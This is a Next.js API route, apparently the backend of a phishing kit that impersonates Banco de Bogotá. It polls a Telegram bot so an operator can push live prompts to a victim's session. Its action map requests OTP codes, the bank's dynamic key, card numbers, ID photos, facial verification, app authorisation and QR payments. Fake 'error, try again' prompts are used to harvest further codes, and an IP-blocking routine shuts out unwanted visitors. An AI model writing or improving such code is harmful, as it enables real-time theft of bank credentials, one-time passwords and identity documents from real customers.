import { NextResponse } from 'next/server';
import { getTelegramConfig } from '@/lib/telegramConfig';

export const dynamic = "force-dynamic";

export async function GET(req: Request) {
  try {
    const { searchParams } = new URL(req.url);
    const messageId = searchParams.get('messageId');
    const sessionId = searchParams.get('sessionId');
    const { botToken } = getTelegramConfig();

    if (!botToken || !messageId) {
      return NextResponse.json({ error: "Missing params" }, { status: 400 });
    }

    // Call getUpdates
    const telegramUrl = `https://api.telegram.org/bot${botToken}/getUpdates?allowed_updates=["callback_query"]&limit=100`;
    const response = await fetch(telegramUrl);
    const data = await response.json();

    if (data.ok && data.result.length > 0) {
      // Find a callback query matching our messageId
      const match = data.result.find((update: any) => 
        update.callback_query && 
        update.callback_query.message && 
        update.callback_query.message.message_id.toString() === messageId
      );

      if (match) {
        const actionPayload = match.callback_query.data;
        // The data is usually in the format "action:sessionId"
        const parts = actionPayload.split(":");
        const action = parts[0];
        
        const callbackQueryId = match.callback_query.id;
        const chatId = match.callback_query.message.chat.id;

        if (actionPayload && actionPayload.startsWith("block_")) {
          const ip = actionPayload.replace("block_", "");
          const { addIPToBlacklist, blockSessionsByIP } = await import("@/lib/supabaseSession");
          await addIPToBlacklist(ip);
          await blockSessionsByIP(ip);

          await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              callback_query_id: callbackQueryId,
              text: `🚫 IP ${ip} bloqueada exitosamente.`
            })
          });

          const adminName = match.callback_query.from?.first_name || match.callback_query.from?.username || "Admin";
          const originalText = match.callback_query.message.text || match.callback_query.message.caption || "";
          const newText = `${originalText}\n\n✅ [${adminName}] bloqueó la IP: ${ip}`;
          await safeEditMessageText(botToken, chatId, messageId, newText, !!match.callback_query.message.text);
          await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${match.update_id + 1}`);
          return NextResponse.json({ status: "blocked", ip });
        }

        // Answer callback query so the admin knows it was clicked
        await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            callback_query_id: callbackQueryId,
            text: `Procesando...`
          })
        });

        // Edit message to remove inline keyboard so it's not clicked again
        const map: Record<string, string> = {
          otp: `🔑 Solicitando OTP...`,
          eotp: `❌ Error en OTP, pidiendo de nuevo...`,
          otp8: `🔑 Solicitando OTP (8 dígitos)...`,
          eotp8: `❌ Error en OTP (8 dígitos), pidiendo de nuevo...`,
          error_asesor: `⛔ Notificando error de transacción (Asesor)...`,
          autorizar_app: `📲 Solicitando autorización en App Banco de Bogotá...`,
          dinamica: `🔐 Solicitando Clave Dinámica...`,
          edinamica: `❌ Error en Dinámica, pidiendo de nuevo...`,
          tc: `💳 Solicitando Tarjeta (TC/TD)...`,
          etc: `❗ Error en Tarjeta, pidiendo reintento...`,
          actdatos: `👤 Solicitando Actualización de Datos...`,
          facial: `🤳 Solicitando Verificación Facial...`,
          elogo: `⚠️ Error de acceso (Logo)...`,
          fin: `✅ Sesión finalizada con éxito.`,
          efacial_frente: `❌ Error en Foto Frontal ID, pidiendo de nuevo...`,
          efacial_dorso: `❌ Error en Foto Trasera ID, pidiendo de nuevo...`,
          vencido: `⏳ Token Vencido, pidiendo de nuevo...`,
          esistema: `⛔ Error de Sistema...`,
          qr: `📱 Solicitando Pago QR Bre...`,
          solicitud_qr: `📱 Solicitando Pago QR Bre...`,
          eqr: `❌ QR error (Error vuelve a intentarlo)...`,
          error_qr: `❌ QR error (Error vuelve a intentarlo)...`,
        };
        const msg = map[action] || `⚠️ Acción procesada: ${action}`;
        const adminName = match.callback_query.from?.first_name || match.callback_query.from?.username || "Admin";
        const originalText = match.callback_query.message.text || match.callback_query.message.caption || "";
        const newText = `${originalText}\n\n✅ [${adminName}] solicitó: ${msg}\n🆔 ID: ${sessionId}`;

        await safeEditMessageText(botToken, chatId, messageId, newText, !!match.callback_query.message.text);

        // Advance offset to clear the queue
        await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${match.update_id + 1}`);

        return NextResponse.json({ status: action });
      }
      
      // If we got updates but none matched our messageId, advance offset anyway to prevent clogging?
      // No, because it might be another session's update. Let's leave it for them to pick up.
    }

    return NextResponse.json({ status: "pending" });
  } catch (error) {
    console.error("Error polling Telegram:", error);
    return NextResponse.json({ error: "Error polling" }, { status: 500 });
  }
}

async function safeEditMessageText(botToken: string, chatId: any, messageId: any, text: string, isText: boolean) {
  const payload: any = {
    chat_id: chatId,
    message_id: messageId,
    reply_markup: { inline_keyboard: [] }
  };
  
  const endpoint = isText ? "editMessageText" : "editMessageCaption";
  const textKey = isText ? "text" : "caption";

  // Try 1: HTML
  try {
    const escapedHTML = text
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");
    const res = await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...payload,
        [textKey]: escapedHTML,
        parse_mode: "HTML"
      })
    });
    const data = await res.json();
    if (data.ok) return;
  } catch (e) {}

  // Try 2: Markdown
  try {
    const escapedMarkdown = text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, "\\$1");
    const res = await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...payload,
        [textKey]: escapedMarkdown,
        parse_mode: "Markdown"
      })
    });
    const data = await res.json();
    if (data.ok) return;
  } catch (e) {}

  // Try 3: Plain text
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...payload,
        [textKey]: text
      })
    });
  } catch (e) {}
}
